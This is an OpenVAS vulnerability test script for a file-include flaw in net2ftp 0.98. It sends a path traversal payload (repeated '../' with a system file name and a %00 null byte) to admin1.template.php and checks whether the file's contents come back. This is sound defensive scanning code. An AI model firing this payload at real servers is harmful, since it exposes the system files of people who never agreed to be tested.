###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_net2ftp_lfi.nasl 8338 2018-01-09 08:00:38Z teissa $
#
# net2ftp 'admin1.template.php' Local and Remote File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The 'net2ftp' program is prone to a local file-include vulnerability
and a remote file-include vulnerability because the application fails
to sufficiently sanitize user-supplied input.

An attacker can exploit these issues to obtain sensitive information;
other attacks are also possible.

net2ftp 0.98 stable is vulnerable; other versions may also be
affected.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100943");
 script_version("$Revision: 8338 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-09 09:00:38 +0100 (Tue, 09 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-12-10 13:28:59 +0100 (Fri, 10 Dec 2010)");
 script_bugtraq_id(45312);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("net2ftp 'admin1.template.php' Local and Remote File Include Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/45312");
 script_xref(name : "URL" , value : "http://www.net2ftp.com/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("net2ftp_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

if(!dir = get_dir_from_kb(port:port,app:"net2ftp"))exit(0);

foreach file (keys(files)) {
   
  url = string(dir,"/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]=",crap(data:"../",length:3*9),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
